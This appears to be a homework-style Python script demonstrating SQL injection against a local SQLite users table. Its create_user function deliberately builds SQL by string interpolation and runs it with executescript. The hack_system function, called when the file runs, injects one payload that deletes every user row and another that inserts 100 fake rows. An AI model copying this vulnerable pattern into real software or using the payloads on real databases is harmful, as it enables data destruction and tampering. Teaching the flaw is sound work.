import sqlite3

def create_user(username: str, password: str) -> None:
    with sqlite3.connect('../homework.db') as conn:
        cursor = conn.cursor()
        cursor.executescript(
            f"""
                INSERT INTO 'table_users' (username, password)
                    VALUES ('{username}', '{password}')  
            """
        )
        conn.commit()

def register_user(username: str, password: str) -> None:
    create_user(username, password)

def hack_system() -> None:
    # Injecting malicious data into the system
    malicious_username = "username"
    malicious_password = "'); DELETE FROM table_users; --"
    register_user(malicious_username, malicious_password)

    # Generating large amount of data for injection
    wrong_credentials = ", ".join([f"('wrong_username{i}', 'wrong_password{i}')" for i in range(100)])
    malicious_username = "username"
    malicious_password = f"password'); INSERT INTO table_users (username, password) VALUES {wrong_credentials}; --"
    register_user(malicious_username, malicious_password)

hack_system()
